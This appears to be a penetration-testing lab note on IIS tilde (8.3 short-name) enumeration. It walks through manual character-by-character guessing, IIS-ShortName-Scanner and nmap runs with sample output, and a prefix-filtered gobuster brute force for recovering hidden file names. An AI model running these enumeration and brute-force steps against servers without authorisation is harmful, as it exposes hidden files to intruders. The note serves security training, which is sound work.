> ⚠️ Affects certain (typically older) IIS versions — always confirm the IIS version via nmap/headers before assuming this technique will work.

---

## 1. What It Is

- Technique for uncovering **hidden files, directories, and short (8.3) file names** on vulnerable IIS servers.
- **8.3 short file names**: Windows auto-generates an 8-character name + 3-character extension for every file/folder — even ones meant to be hidden.
- These short names can be used to **access the underlying resource directly**, bypassing the intended (hidden) full name.
- Signified in URLs by a **tilde (`~`)** followed by a sequence number, e.g., `secret~1`.

---

## 2. How the Enumeration Works

The server responds differently (status code) depending on whether a partial short-name guess matches an existing file/folder — allowing **character-by-character brute forcing**.

### Manual Walkthrough
1. Try each letter after `~`:
    ```
    http://example.com/~ahttp://example.com/~bhttp://example.com/~c ...
    ```
    
2. `~s` → **200 OK** → a short name starting with "s" exists.
3. Extend: `~se` → 200 OK → narrows to "se".
4. Extend: `~sec` → 200 OK → narrows to "sec".
5. Continue until `~secret` → 200 OK → full short name **`secret~1`** discovered (mapped to a hidden folder, e.g., `SecretDocuments`).

### Accessing Contents Once the Short Name Is Known

```
http://example.com/secret~1/somefile.txt
http://example.com/secret~1/anotherfile.docx
```

### Same Technique Applies to Files

```
http://example.com/secret~1/somefi~1.txt
```

- The trailing number (`~1`, `~2`, …) disambiguates files with similar names in the same directory:
    - `somefile.txt` → `somefi~1.txt`
    - `somefile1.txt` → `somefi~2.txt`

---

## 3. Enumeration in Practice

### Step 1 — Confirm IIS Version

```bash
nmap -p- -sV -sC --open 10.129.224.91
```

```
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
```

> IIS 7.5 is a good candidate for testing tilde enumeration.

### Step 2 — Automate with IIS-ShortName-Scanner

Manual per-letter brute forcing is tedious — use **IIS-ShortName-Scanner** (Java-based, from GitHub). Requires Oracle Java installed.
https://github.com/irsdl/IIS-ShortName-Scanner.git

```bash
java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
```

- Prompts for proxy — hit Enter for **No**.

**Example output:**

```
Result: Vulnerable!
Used HTTP method: OPTIONS
Suffix (magic part): /~1/
Identified directories: 2
  ASPNET~1
  UPLOAD~1
Identified files: 3
  CSASPX~1.CS
  CSASPX~1.CS??
  TRANSF~1.ASP
```

> Confirms the target is vulnerable and enumerates both hidden directories and file short names in one pass.

---

## 4. Resolving Full Filenames from Short Names

If direct access to a discovered short name is blocked (e.g., `GET /TRANSF~1.ASP` denied), brute-force the **full filename** using the short name as a prefix constraint.

### Step 1 — Build a Targeted Wordlist

```bash
egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
```

| Part                   | Purpose                                                                           |
| ---------------------- | --------------------------------------------------------------------------------- |
| `egrep -r ^transf`     | Recursively search all wordlists for lines starting with "transf"                 |
| `\| sed 's/^[^:]*://'` | Strip the `filename:` prefix that `egrep -r` adds, leaving just the matched words |
| `> /tmp/list.txt`      | Save the filtered wordlist                                                        |

### Step 2 — Brute-Force with Gobuster

```bash
gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp
```

```
/transf**.aspx        (Status: 200) [Size: 941]
```

Full filename recovered — resolves `TRANSF~1.ASP`'s short name to its actual `.aspx` file.

---

## Summary

|Step|Tool/Technique|
|---|---|
|Confirm vulnerable IIS version|`nmap -sV -sC`|
|Enumerate short names (dirs + files)|**IIS-ShortName-Scanner** (Java)|
|Build a targeted wordlist from a known prefix|`egrep -r ^<prefix> /usr/share/wordlists/* \| sed`|
|Resolve full filename|**Gobuster** with the targeted wordlist + relevant extensions|

## Key Takeaways

- Tilde enumeration turns a **hidden resource** into a **discoverable one**, one character at a time, via HTTP status code differences.
- IIS-ShortName-Scanner automates the character-by-character brute force and can identify vulnerability in one run using the `OPTIONS` method.
- Once a short name is known but direct access is blocked, narrow a wordlist to entries starting with that prefix and brute-force with **Gobuster** to recover the full filename — much faster than a generic wordlist run.
- The 8.3 short-name system's number suffix (`~1`, `~2`, …) exists purely to disambiguate similarly-named files — useful context when multiple short names collide on the same prefix.